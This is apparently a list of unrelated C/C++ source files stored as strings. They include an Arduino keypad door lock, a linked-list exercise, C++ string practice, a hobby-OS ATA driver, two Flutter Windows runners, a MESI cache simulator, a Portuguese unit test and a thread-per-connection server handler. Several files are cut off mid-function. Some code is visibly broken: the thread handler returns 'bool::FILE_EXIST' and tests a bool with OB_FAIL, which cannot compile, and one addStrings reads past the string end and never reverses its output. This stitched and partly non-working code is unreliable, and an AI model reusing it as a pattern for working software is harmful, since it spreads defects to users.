    "#include <Wire.h>\n#include <LiquidCrystal_I2C.h>\n#include <Keypad.h>\n#include <ctype.h>\n#include <EEPROM.h>\n\n#define ADDRESS 63\n#define LCD_R 16\n#define LCD_C 4\n#define MAX_ATTEMPT 5\n#define WAIT 40\n\nconst byte ROWS = 4;\nconst byte COLS = 4;\nint i = 0, j = 0;\nint attempt = 1;\nchar str[16];\n\nchar hexaKeys[ROWS][COLS] = {\n  { '1', '2', '3', 'A' },\n  { '4', '5', '6', 'B' },\n  { '7', '8', '9', 'C' },\n  { '*', '0', '#', 'D' }\n};\n\nbyte rowPins[ROWS] = { 9, 8, 7, 6 };\nbyte colPins[COLS] = { 5, 4, 3, 2 };\n\nKeypad myKeypad = Keypad(makeKeymap(hexaKeys), rowPins, colPins, ROWS, COLS);\nLiquidCrystal_I2C lcd(ADDRESS, LCD_R, LCD_C);\n\nclass Doorlock {\nprivate:\n  int delayForLock;\n  //don't waste space in creating long array\n  char correct[16];\n  char arr[16];\n  // correct = EEPROM.get(10, arr);\npublic:\n  Doorlock() {}\n  Doorlock(int delayForLock) {\n    this->delayForLock = delayForLock;\n  }\n\n  void init() {\n  }\n  \n\n  void enter(char s[]) {\n    Serial.print(\"enter called.\");\n    lcd.clear();\n\n    int result = strcmp(EEPROM.get(10, arr), s);\n    if (result == 0) {\n      lcd.print(\"Pin matched\");\n      digitalWrite(11, HIGH);\n      for(int i=this->delayForLock/1000; i>=0; i--){\n        lcd.setCursor(0, 1);\n        lcd.print(i);\n        delay(1000);\n      }\n      lcd.clear();\n      for (int a = 0; a < 15; a++) {\n        str[a] = 0;\n      }\n      //Serial.write(delayForLock);\n      //delay(this->delayForLock);\n      digitalWrite(11, LOW);\n\n    } else {\n      lcd.print(\"Incorrect pin\");\n      for (int a = 0; a < 15; a++) {\n        str[a] = 0;\n      }\n      delay(1000);\n      lcd.clear();\n      Serial.println(\"Incorrect pin\");\n      \n      if(attempt >= MAX_ATTEMPT){\n        Serial.print(\"Maximum attempts exceded\");\n        lcd.setCursor(0, 0);\n        lcd.print(\"Try after\");\n        lcd.setCursor(0, 1);\n        lcd.print(\"seconds\");\n        for(int i=WAIT; i>0; i--){\n          attempt = 1;\n          lcd.setCursor(10, 0);\n          //lcd.clear();\n          if(i<10){\n            lcd.setCursor(10, 0);\n            lcd.print(\"0\");\n          }\n          lcd.print(i);\n          delay(1000);\n          \n        }\n      }\n      Serial.println(attempt);\n      attempt++;\n      lcd.clear();\n    }\n  }\n\n\n\n  void changePassword(char s[]) {\n    //Now that's something breathtaking\n    bool flag1 = true, flag2 = true;\n    //Serial.println(\"change password called\");\n    lcd.clear();\n    lcd.setCursor(0, 0);\n    lcd.print(\"Enter the\");\n    lcd.setCursor(0, 1);\n    lcd.print(\"correct pin: \");\n    delay(1000);\n    lcd.clear();\n    Serial.println(\"After delay\");\n    \n    while(flag2){\n    char myKeys = myKeypad.getKey();\n    //Doorlock doorlock(5000);\n    // ChangePassword cp;\n\n   \n    if (myKeys) {\n      if (((myKeys - '0' <= 9) && (myKeys - '0' >= 1)) || (myKeys - '0' == 0)) {\n        str[i] = (myKeys);\n        Serial.print(\"Key pressed\");\n        lcd.setCursor(i, 0);\n        lcd.print(myKeys);\n        i++;\n      } else if (myKeys - '0' == -13) {\n        flag1 = false;\n\n        i = 0;\n        lcd.clear();\n        lcd.setCursor(0, 0);\n        lcd.print(\"Matching.\");\n        delay(1000);\n        //doorlock.enterForPasswordChange(str);\n        // cp.enter(str);\n        //Serial.println(\"enter of change password called\");\n        lcd.clear();\n\n        int result = strcmp(EEPROM.get(10, arr), s);\n        if (result == 0) {\n          lcd.print(\"Pin matched.\");\n          delay(1000);\n          lcd.clear();\n          lcd.setCursor(0, 0);\n          lcd.print(\"Enter new\");\n          lcd.setCursor(0, 1);\n          lcd.print(\"password: \");\n          delay(1000);\n          lcd.clear();\n          lcd.setCursor(0, 0);\n          char myKeys = myKeypad.getKey();\n          Doorlock doorlock(5000);\n          for (int a = 0; a < 15; a++) {\n            str[a] = 0;\n          }\n          \n          \n          while(flag2){\n          myKeys = myKeypad.getKey();\n          if (myKeys) {\n            if (((myKeys - '0' <= 9) && (myKeys - '0' >= 1)) || (myKeys - '0' == 0)) {\n              str[i] = (myKeys);\n              //Serial.print(myKeys);\n              lcd.setCursor(i, 0);\n              lcd.print(myKeys);\n              i++;\n            } else if (myKeys - '0' == -13) {\n              flag2 = false;\n              i = 0;\n              lcd.clear();\n              lcd.setCursor(0, 0);\n              lcd.print(\"Password changed\");\n              delay(1000);\n              //strcpy(EEPROM.get(10, arr), str);\n              EEPROM.put(10, str);\n              for (int i = 0; i < 15; i++) {\n                Serial.print(correct[i]);\n                Serial.print(\" \");\n              }\n\n            } else if (myKeys - '0' == -6) {\n      i = 0;\n      for (int a = 0; a < 15; a++) {\n        str[a] = 0;\n      }\n      lcd.clear();\n      lcd.setCursor(0, 0);\n      lcd.print(\"Cleared\");\n      delay(1000);\n      lcd.clear();\n    } else {\n              //TODO\n              Serial.print(\"Other\");\n            }\n          }\n          }\n\n        } else {\n          lcd.print(\"Incorrect pin\");\n        }",
    "//{ Driver Code Starts\n\n#include <bits/stdc++.h>\nusing namespace std;\n\nstruct Node {\n    char data;\n    struct Node *next;\n\n    Node(int x) {\n        data = x;\n        next = NULL;\n    }\n};\n\nvoid printlist(Node *head) {\n    if (head == NULL)\n        return;\n    while (head != NULL) {\n        cout << head->data << \" \";\n        head = head->next;\n    }\n    cout << endl;\n}\n\nvoid append(struct Node **headRef, char data) {\n    struct Node *new_node = new Node(data);\n    struct Node *last = *headRef;\n\n    if (*headRef == NULL) {\n        *headRef = new_node;\n        return;\n    }\n    while (last->next != NULL)\n        last = last->next;\n    last->next = new_node;\n    return;\n}\n\n\n// } Driver Code Ends\n\n\nclass Solution {\n  public:\n    struct Node *arrangeCV(Node *head) {\n        if (!head || !head->next) return head; // If list is empty or has one element\n        Node *vowelHead = nullptr, *vowelTail = nullptr;\n        Node *consonantHead = nullptr, *consonantTail = nullptr;\n        auto isVowel = [](char c) {\n            return c == 'a' || c == 'e' || c == 'i' || c == 'o' || c == 'u';\n        };\n        Node* current = head;\n        while (current) {\n            if (isVowel(current->data)) {\n                // Add to vowel list\n                if (!vowelHead) {\n                    vowelHead = vowelTail = current;\n                } else {\n                    vowelTail->next = current;\n                    vowelTail = vowelTail->next;\n                }\n            } else {\n                if (!consonantHead) {\n                    consonantHead = consonantTail = current;\n                } else {\n                    consonantTail->next = current;\n                    consonantTail = consonantTail->next;\n                }\n            }\n            current = current->next;\n        }\n        if (vowelTail) {\n            vowelTail->next = consonantHead;\n        }\n        if (consonantTail) {\n            consonantTail->next = nullptr; }\n        return vowelHead ? vowelHead : consonantHead;\n    }\n};\n\n\n\n//{ Driver Code Starts.\n\n// task is to complete this function\nint main() {\n\n    int T;\n    cin >> T;\n    cin.ignore();\n    while (T--) {\n        vector<char> arr;\n        string input;\n        getline(cin, input);\n        stringstream ss(input);\n        char number;\n        while (ss >> number) {\n            arr.push_back(number);\n        }\n        if (arr.empty()) {\n            return NULL;\n        }\n        char val = arr[0];\n        int size = arr.size();\n\n        Node *head = new Node(val);\n        Node *tail = head;\n\n        for (int i = 1; i < size; i++) {\n            val = arr[i];\n            tail->next = new Node(val);\n            tail = tail->next;\n        }\n\n        Solution obj;\n        head = obj.arrangeCV(head);\n        printlist(head);\n    }\n    return 0;\n}\n\n// } Driver Code Ends",
    "#include <iostream>\n\n// #include \"stu.cpp\"\n#include <string>\n#include <vector>\n#include <stack>\n#include <list>\n#include <queue>\n#include <deque>\n#include <forward_list>\n// #include <priority_queue>\n#include<algorithm>\n\n\n//int main() {\n//    // std::cout << \"Hello, World!\" << std::endl;\n//    stu <int>s(22,\"lisi\");\n//\n//    s.showInfo();\n//    return 0;\n//}\n//int main() {\n//    //int arr[3] = {1, 2, 3};\n//    // cout << sizeof(arr);\n//    string s1(\"aaa\");\n//    string s2(\"hello\",2);\n//    // cout << sizeof(s)/sizeof(s[0]);\n//    // cout << s1.size();\n//    // cout << s2;\n//    s2 += \"111111\";\n//    for(char c : s2) {\n//        cout << c << \" \";\n//    }\n//    for(int i = 0;i < s2.size();i++) {\n//        s2[i] = '0';\n//    }*/\n//    for(char c : s2) {\n//        cout << c << \" \";\n//    }\n// string::iterator// \u53ef\u4ee5\u7528 auto \u7b80\u5316// \u957f\u671f\u5feb\u4e50,\u771f\u9999~\n//    auto i = s2.begin();\n//    while(i != s2.end()) {\n//        *i = 'a';\n//        i++;\n//   }\n//\n//    auto ri = s2.rbegin();\n//    while(ri != s2.rend()) {\n//        cout << *ri << \" \";\n//        ri++;\n//    }\n//\n//\n//    cout << s2.size() << endl;\n//    cout << s2.capacity() << endl;\n//    return 0;\n//}\n\nusing namespace std;\n// using namespace cxw;\n\nvoid test01() {\n    string s = \"aaa\";\n    s.insert(2,\"111\");\n    s.insert(2,5,'2');\n    cout << s << endl;\n    cout << s.size() << endl;\n    cout << s[0] << endl;\n    cout << s[s.size() - 1] << endl;\n    // Leetcode : 917\n}\n\nvoid test02() {\n//    string s = \"aaa\";\n//    s += '\\0';\n//    s +=\"222\";\n//    cout << s;\n    string s = \"vvvvvvaa\";\n    const char* str = s.c_str();\n    // cout << str;\n//    int ret = s.find('a');\n//    cout << ret;\n    string url(\"https://legacy.cplusplus.com/reference/string/string/find/\");\n    int pos = url.find(':');\n    if(pos != string::npos) {\n        string http(url.substr(0, pos));\n        cout << http << endl;\n    }\n    int pos1 = url.find('/',pos + 3);\n    if(pos1 != string::npos) {\n        string web(url.substr(pos + 3, pos1 - pos - 3));\n        cout << web;\n    }\n}\n\nvoid test03() {\n    string str;\n    getline(cin,str);\n    //string str = \"aaaaa ss d\";\n    // ret = 4\n    int pos = str.rfind(' ');\n    cout << str.size() - 1 - pos;\n}\n\n\nclass Solution01 {\npublic:\n    int switchInt(string s) {\n        int ret = 0;\n        for (auto c : s) {\n            ret = ret * 10 + (c - '0');\n        }\n        return ret;\n    }\n    string addStrings(string num1, string num2) {\n        int n1 = switchInt(num1);\n        int n2 = switchInt(num2);\n        return to_string(n1 + n2);\n    }\n};\n\nstring addStrings(string num1, string num2) {\n    int next = 0; // \u8fdb\u4f4d\n    string s;\n    int sum = 0;\n    int end1 = num1.size(),end2 = num2.size();\n    while(end1 >= 0 || end2 >= 0) {\n        int n1 = 0,n2 = 0;\n        if(end1 >= 0)\n            n1 = num1[end1] - '0';\n        if(end2 >= 0)\n            n2 = num2[end2] - '0';\n        sum = n1 + n2 + next;\n        next = sum / 10;\n        sum = sum % 10;\n        s += (sum + '0');\n        end1--;\n        end2--;\n    }\n    return s;\n}\n\n\n//void test04() {\n//    mystring s1;\n//    mystring s2(\"abafgmjh\");\n//    for(int i = 0;i < s2.size();i++) {\n//        s2[i] = '1';\n//        cout << s2[i] << \" \";\n//    }\n//}\n\n\nvoid test05() {\n    string s1;\n    string s2(\"aaa\");\n    string s3(10,'c');\n    string s4(s2);\n    cout << s1 << endl;\n    cout << s2 << endl;\n    cout << s3 << endl;\n    cout << s4 << endl;\n\n}\n\n\n//void test06() {\n//    string s(\"cen's \");\n//    s.insert(6,\"blo\");\n//    s.insert(s.end(),'g');\n//    cout << s;  // cen's blog\n//}\n\n\n\n//int main() {\n//    string s(\"cen\");\n//    s += \"'s \";\n//    s += \"blog\";\n//    s.pop_back();\n//    cout << s;\n//    return 0;\n//}\n\n//int main() {\n//    string str = \"oishbnsv;lkbds\";\n//    str.erase(str.begin() + 3);\n//    str.erase(6,4);\n//    cout << str;    // oisbnsbds\n//    return 0;\n//}\n\n//int main() {\n//    string str1(\"abcd\");\n//    string str2(\"abde\");\n//    cout << str1.compare(str2); // -1\n//    return 0;\n//}\n\nvoid fun1() {\n    string s(\"abcdef\");\n    // string::iterator it = s.begin();\n    auto it = s.begin();\n    while(it != s.end()) {\n        cout << *it << \" \";\n        it++;\n    }\n}\n\nvoid fun2() {\n    string s(\"abcdef\");\n    // string::reverse_iterator it = s.begin();\n    auto it = s.rbegin();\n    while(it != s.rend()) {\n        cout << *it << \" \";\n        it++;\n    }\n}\n\n//int main() {\n//    string s1(\"asd\");\n//    string s2(\"dddd\");\n//    s1.swap(s2);\n//    cout << s2;\n//    return 0;\n//}\n\n\nvoid fun01() {\n    vector<int> v;\n    v.push_back(100);\n    v.push_back(44);\n    v.push_back(2);\n    v.push_back(678);\n    v.push_back(678);\n    v.push_back(678);\n//    for(vector<int>:: const_reverse_iterator it = v.rbegin();it != v.rend();it++) {\n//        cout << *it << \" \";\n//    }\n//    for(auto i : v) {\n//        cout << i << endl;\n//    }\n    // v.push_back()\n\n    // iterator\n    // const_iterator\n    // reverse_iterator\n    // const_reverse_iterator\n    cout << v.size() << v.capacity();\n}\n\n\nvoid singleNumber(vector<int>& nums) {\n    int ar",
    "#include <drivers/ata.h>\n\nusing namespace jackos;\nusing namespace jackos::common;\nusing namespace jackos::drivers;\nusing namespace jackos::hardware;\n\nvoid printf(const char* str);\n\nAdvancedTechnologyAttachment::AdvancedTechnologyAttachment(uint16_t portBase, bool master)\n:   dataPort(portBase),\n    errorPort(portBase + 1),\n    sectorCountPort(portBase + 2),\n    lbaLowPort(portBase + 3),\n    lbaMidPort(portBase + 4),\n    lbaHiPort(portBase + 5),\n    devicePort(portBase + 6),\n    commandPort(portBase + 7),\n    controlPort(portBase + 0x206)\n{\n    bytesPerSector = 512;\n    this -> master = master;\n}\n\nAdvancedTechnologyAttachment::~AdvancedTechnologyAttachment() {\n\n}\n\nvoid AdvancedTechnologyAttachment::Identify() {\n    devicePort.Write(master ? 0xA0 : 0xB0);\n    controlPort.Write(0);\n\n    devicePort.Write(0xA0);\n    uint8_t status = commandPort.Read();\n    if(status == 0xFF) {\n        return;\n    }\n\n    devicePort.Write(master ? 0xA0 : 0xB0);\n    sectorCountPort.Write(0);\n    lbaLowPort.Write(0);\n    lbaMidPort.Write(0);\n    lbaHiPort.Write(0);\n    commandPort.Write(0xEC);\n\n    status = commandPort.Read();\n    if(status == 0x00) {\n        return; // No device\n    }\n\n    while(((status & 0x80) == 0x80)\n            && ((status & 0x01) != 0x01)) {\n                status = commandPort.Read();\n            }\n    if(status & 0x01) {\n        printf(\"ERROR\");\n        return;\n    }\n\n    for(uint16_t i = 0; i < 256; i++) {\n        uint16_t data = dataPort.Read();\n        char foo[] = \"  \\0\";\n        foo[1] = (data >> 8) & 0x00FF;\n        foo[0] = data & 0x00FF;\n        printf(foo);\n    }\n}\n\nvoid AdvancedTechnologyAttachment::Read28(uint32_t sector, uint8_t* data, int count) {\n    if(sector & 0xF0000000) {\n        return;\n    }\n    if(count > bytesPerSector) {\n        return;\n    }\n\n    devicePort.Write((master ? 0xE0 : 0xF0) | ((sector & 0x0F000000) >> 24));\n    errorPort.Write(0);\n    sectorCountPort.Write(1);\n\n    lbaLowPort.Write(sector & 0x000000FF);\n    lbaMidPort.Write((sector & 0x0000FF00) >> 8);\n    lbaHiPort.Write((sector & 0x00FF0000) >> 16);\n    commandPort.Write(0x20);\n\n    uint8_t status = commandPort.Read();\n\n    while(((status & 0x80) == 0x80) && ((status & 0x01) != 0x01)) {\n        status = commandPort.Read();\n    }\n\n    if(status & 0x01) {\n        printf(\"ERROR\");\n        return;\n    }\n\n    printf(\"Reading from ATA: \");\n\n    for(uint16_t i = 0; i < count; i += 2) {\n        uint16_t wdata  = dataPort.Read();\n        char foo[] = \"  \\0\";\n        foo[1] = (wdata >> 8) & 0x00FF;\n        foo[0] = wdata & 0x00FF;\n        printf(foo);\n\n        data[i] = wdata & 0x00FF;\n        if(i + 1 < count) {\n            data[i+1] = (wdata >> 8) & 0x00FF;\n        }\n    }\n\n    for(uint16_t i = count + (count % 2); i < bytesPerSector; i += 2) {\n        dataPort.Read();\n    }\n}\n\nvoid AdvancedTechnologyAttachment::Write28(uint32_t sector, uint8_t* data, int count) {\n    if(sector & 0xF0000000) {\n        return;\n    }\n    if(count > bytesPerSector) {\n        return;\n    }\n \n    devicePort.Write((master ? 0xE0 : 0xF0) | ((sector & 0x0F000000) >> 24));\n    errorPort.Write(0);\n    sectorCountPort.Write(1);\n\n    lbaLowPort.Write(sector & 0x000000FF);\n    lbaMidPort.Write((sector & 0x0000FF00) >> 8);\n    lbaHiPort.Write((sector & 0x00FF0000) >> 16);\n    commandPort.Write(0x30);\n\n    printf(\"Writing to ATA: \");\n\n    for(uint16_t i = 0; i < count; i += 2) {\n        uint16_t wdata  = data[i];\n        if(i + 1 < count) {\n            wdata |= ((uint16_t)data[i+1]) << 8;\n        }\n        char foo[] = \"  \\0\";\n        foo[1] = (wdata >> 8) & 0x00FF;\n        foo[0] = wdata & 0x00FF;\n        printf(foo);\n        dataPort.Write(wdata);\n    }\n\n    for(uint16_t i = count + (count % 2); i < bytesPerSector; i += 2) {\n        dataPort.Write(0x0000);\n    }\n}\n\nvoid AdvancedTechnologyAttachment::Flush() {\n    devicePort.Write(master ? 0xE0 : 0xF0);\n    commandPort.Write(0xE7);\n\n    uint8_t status = commandPort.Read();\n\n    while(((status & 0x80) == 0x80)\n            && ((status & 0x01) != 0x01)) {\n                status = commandPort.Read();\n            }\n    if(status & 0x01) {\n        printf(\"ERROR\");\n        return;\n    }\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"wisata_candi\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <cstdlib>\n#include <iostream>\n#include <vector>\n#include <cstring>\n#include <algorithm>\n#include <map>\n#include <queue>\n#include <fstream>\n\nusing namespace std;\n\nstruct Operation{\n    bool op; // op == 0 read, op == 1 write; \n    int tar, idx; // tar is the target core of this operation\n    long long addr;\n    string origin_add;\n    bool operator < (const Operation &x) const{\n        return idx < x.idx;\n    }\n    Operation(){\n        this->op = 0;\n        this->addr = 0;\n    }\n    Operation(bool op, int tar, int idx, string add){\n        this->op = op;\n        this->tar = tar;\n        this->idx = idx;\n        int len = add.size();\n        long long base = 1, addr = 0;\n        for(int i=len - 1; i >= 0; i--){\n            char x = add[i];\n            int val;\n            if(x >= 'A' && x <= 'Z')\n                x = x - 'A' + 'a';\n            if(x >= 'a' && x <= 'z')\n                val = (int)x - 'a' + 10;\n            if( x>= '0' && x <= '9')\n                val = (int)x - '0';\n            addr += base * val;\n            base *= 16;\n        }\n        this->addr = addr;\n        this->origin_add = add;\n    }\n};\nvector <Operation> v;\nenum Status{\n    M,\n    E,\n    S,\n    I\n};\nchar status_char[] = {'M', 'E', 'S', 'I'};\nstruct Core{\n    long long cache_start;\n    Status status;\n    Core(){}\n    Core(long long start, Status status){\n        this->cache_start = start;\n        this->status = status;\n    }\n}core[2];\nvoid Deal(Operation op){\n\tcout<<string(50,'-')<<endl;\n    int op_core = op.tar;\n    //cout<<op.idx<<\" \";\n    cout<<\"Currently operating on core \"<< op_core << endl;\n    cout<<\"Currently operating address is \"<< op.origin_add << \", Operating type is \";\n    if(op.op == 0)  cout<<\"read.\\n\";\n    else cout<<\"write.\\n\";\n    long long cache_start = op.addr / 64 * 64;\n    core[op_core].cache_start = cache_start;\n    char s_0 = status_char[core[0].status], s_1 = status_char[core[1].status];\n    if(core[op_core ^ 1].cache_start == cache_start){ // this segment of memory is occupyed by other core\n        if(op.op == 0){ //read\n            core[op_core ^ 1].status = S;\n            core[op_core].status = S;\n        }else {\n            core[op_core ^ 1].status = I;\n            core[op_core ^ 1].cache_start = -1;\n            core[op_core].status = M;\n        }\n    }else {//this cache line's status is I by default\n        core[op_core].status = E; //read\n        if(op.op == 1){\n            core[op_core].status = M; //write\n        }\n    }\n\tchar fs_0 = status_char[core[0].status], fs_1 = status_char[core[1].status];\n\tif(core[0].cache_start != -1)\n\tcout<<\"Core 0's cache save the memory from address \"\n\t\t<<core[0].cache_start<<\" to address \"<<(core[0].cache_start+64)<<endl;\n\telse cout<<\"There are no memory in Core 0's cache!\\n\";\n\tif(core[1].cache_start != -1)\n\tcout<<\"Core 1's cache save the memory from address \"\n\t\t<<core[1].cache_start<<\" to address \"<<(core[1].cache_start+64)<<endl;\n\telse cout<<\"There are no memory in Core 1's cache!\\n\";\n\tcout<<\"Core 0's status from \"<<s_0<<\" to \"<<fs_0<<endl;\n    cout<<\"Core 1's status from \"<<s_1<<\" to \"<<fs_1<<endl;\n\treturn;\n}\n\nint main(){\n    bool op;\n    int idx = 0;\n    string add;\n    ifstream file0(\"trace0.txt\");\n    while(file0 >> op){\n        file0 >> add;\n        v.push_back(Operation(op, 0, idx++, add));\n    }\n    file0.close();\n    ifstream file1(\"trace1.txt\");\n    idx=0;\n    while(file1 >> op){\n        file1 >> add;\n        v.push_back(Operation(op, 1, idx++, add));\n    }\n    file1.close();\n    //memory address used Byte, a cache line's length is 64B, 0040H\n    core[0] = Core(-1, I);\n    core[1] = Core(-1, I);\n    sort(v.begin(), v.end());\n    for(int i = 0; i < v.size(); i++)\n        Deal(v[i]);\n    return 0;\n}\n",
    "#include <iostream>\n#include <sstream>\n#include \"nome.h\"\n\n// Declara\u00e7\u00f5es dos m\u00e9todos da casse Nome\n\nvoid Nome::validar(string val)\n{\n    if (val.length() > VALORMAXIMO)\n        throw invalid_argument(\"O nome deve conter menos que 30 caracteres.\");\n}\n\nvoid Nome::setValor(string val)\n{\n    validar(val);\n    this->valor = val;\n}\n\n// Declara\u00e7\u00f5es dos m\u00e9todos do Teste Unit\u00e1rio TUNome\n\nvoid TUNome::setUp()\n{\n    nome = new Nome();\n    estado = sucesso;\n}\n\nvoid TUNome::tearDown()\n{\n    delete nome;\n}\n\nvoid TUNome::testarCenariosSucesso()\n{\n    try\n    {\n        for (size_t i = 0; i < (sizeof(VALORES_VALIDOS) / sizeof(VALORES_VALIDOS[0])); i++)\n        {\n            string valorValido = VALORES_VALIDOS[i];\n            nome->setValor(valorValido);\n            if (nome->getValor() != valorValido)\n                estado = falha;\n        }\n    }\n    catch (...)\n    {\n        estado = falha;\n    }\n}\n\nvoid TUNome::testarCenariosFalha()\n{\n    for (size_t i = 0; i < (sizeof(VALORES_INVALIDOS) / sizeof(VALORES_INVALIDOS[0])); i++)\n    {\n        string valorInvalido = VALORES_INVALIDOS[i];\n\n        try\n        {\n            estado = falha;\n            nome->setValor(valorInvalido);\n        }\n        catch (...)\n        {\n            if (nome->getValor() != valorInvalido)\n                estado = sucesso;\n        }\n    }\n}\n\nEstadoTeste TUNome::run()\n{\n    setUp();\n    testarCenariosSucesso();\n    testarCenariosFalha();\n    tearDown();\n    return estado;\n}\n\nint main()\n{\n    TUNome testeNome;\n\n    switch (testeNome.run())\n    {\n    case sucesso:\n        cout << \"\\nSUCESSO - Nome\";\n        break;\n    case falha:\n        cout << \"\\nFALHA   - Nome\";\n        break;\n    }\n}\n",
    "\n#include <poll.h>\n\n#include \"./one_thread_per_connection_thread_handler.h\"\n#include \"../common/log.h\"\n#include \"../lang/thread.h\"\n#include \"../lang/mutex.h\"\n#include \"../lang/chrono.h\"\n#include \"./communicator.h\"\n\nusing namespace common;\n\nclass Worker\n{\npublic:\n  Worker(ThreadHandler &host, Communicator *communicator) \n    : host_(host), communicator_(communicator)\n  {}\n  ~Worker()\n  {\n    if (thread_ != nullptr) {\n      stop();\n      join();\n    }\n  }\n\n  bool start()\n  {\n    thread_ = new thread(std::ref(*this));\n    return 1;\n  }\n\n  bool stop()\n  {\n    running_ = false;\n    return 1;\n  }\n\n  bool join()\n  {\n    if (thread_) {\n      if (thread_->get_id() == this_thread::get_id()) {\n        thread_->detach(); // \u5982\u679c\u5f53\u524d\u7ebf\u7a0bjoin\u5f53\u524d\u7ebf\u7a0b\uff0c\u5c31\u4f1a\u5361\u6b7b\n      } else {\n        thread_->join();\n      }\n      delete thread_;\n      thread_ = nullptr;\n    }\n    return 1;\n  }\n\n  void operator()()\n  {\n    LOG_INFO(\"worker thread start. communicator = %p\", communicator_);\n    int ret = thread_set_name(\"SQLWorker\");\n    if (ret != 0) {\n      LOG_WARN(\"failed to set thread name. ret = %d\", ret);\n    }\n\n    struct pollfd poll_fd;\n    poll_fd.fd = communicator_->fd();\n    poll_fd.events = POLLIN;\n    poll_fd.revents = 0;\n\n    while (running_) {\n      int ret = poll(&poll_fd, 1, 500);\n      if (ret < 0) {\n        LOG_WARN(\"poll error. fd = %d, ret = %d, error=%s\", poll_fd.fd, ret, strerror(errno));\n        break;\n      } else if (0 == ret) {\n        // LOG_TRACE(\"poll timeout. fd = %d\", poll_fd.fd);\n        continue;\n      }\n\n      if (poll_fd.revents & (POLLERR | POLLHUP | POLLNVAL)) {\n        LOG_WARN(\"poll error. fd = %d, revents = %d\", poll_fd.fd, poll_fd.revents);\n        break;\n      }\n\n      bool rc = task_handler_.handle_event(communicator_);\n      if (OB_FAIL(rc)) {\n        LOG_ERROR(\"handle error. rc = %s\", strrc(rc));\n        break;\n      }\n    }\n\n    LOG_INFO(\"worker thread stop. communicator = %p\", communicator_);\n    host_.close_connection(communicator_); /// \u8fde\u63a5\u5173\u95ed\u540e\uff0c\u5f53\u524d\u5bf9\u8c61\u4f1a\u88ab\u5220\u9664\n  }\n\nprivate:\n  ThreadHandler &host_;\n  SqlTaskHandler task_handler_;\n  Communicator *communicator_ = nullptr;\n  thread *thread_ = nullptr;\n  volatile bool running_ = true;\n};\n\nOneThreadPerConnectionThreadHandler::~OneThreadPerConnectionThreadHandler()\n{\n  stop();\n  await_stop();\n}\n\nbool OneThreadPerConnectionThreadHandler::new_connection(Communicator *communicator)\n{\n  lock_guard guard(lock_);\n\n  auto iter = thread_map_.find(communicator);\n  if (iter != thread_map_.end()) {\n    LOG_WARN(\"connection already exists. communicator = %p\", communicator);\n    return bool::FILE_EXIST;\n  }\n\n  Worker *worker = new Worker(*this, communicator);\n  thread_map_[communicator] = worker;\n  return worker->start();\n}\n\nbool OneThreadPerConnectionThreadHandler::close_connection(Communicator *communicator)\n{\n  lock_.lock();\n  auto iter = thread_map_.find(communicator);\n  if (iter == thread_map_.end()) {\n    LOG_WARN(\"connection not exists. communicator = %p\", communicator);\n    lock_.unlock();\n    return bool::FILE_NOT_EXIST;\n  }\n\n  Worker *worker = iter->second;\n  thread_map_.erase(iter);\n  lock_.unlock();\n\n  worker->stop();\n  worker->join();\n  delete worker;\n  delete communicator;\n  LOG_INFO(\"close connection. communicator = %p\", communicator);\n  return 1;\n}\n\nbool OneThreadPerConnectionThreadHandler::stop()\n{\n  lock_guard guard(lock_);\n  for (auto iter = thread_map_.begin(); iter != thread_map_.end(); ++iter) {\n    Worker *worker = iter->second;\n    worker->stop();\n  }\n  return 1;\n}\n\nbool OneThreadPerConnectionThreadHandler::await_stop()\n{\n  LOG_INFO(\"begin to await stop one thread per connection thread handler\");\n  while (!thread_map_.empty()) {\n    this_thread::sleep_for(chrono::milliseconds(100));\n  }\n  LOG_INFO(\"end to await stop one thread per connection thread handler\");\n  return 1;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"aimfit\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
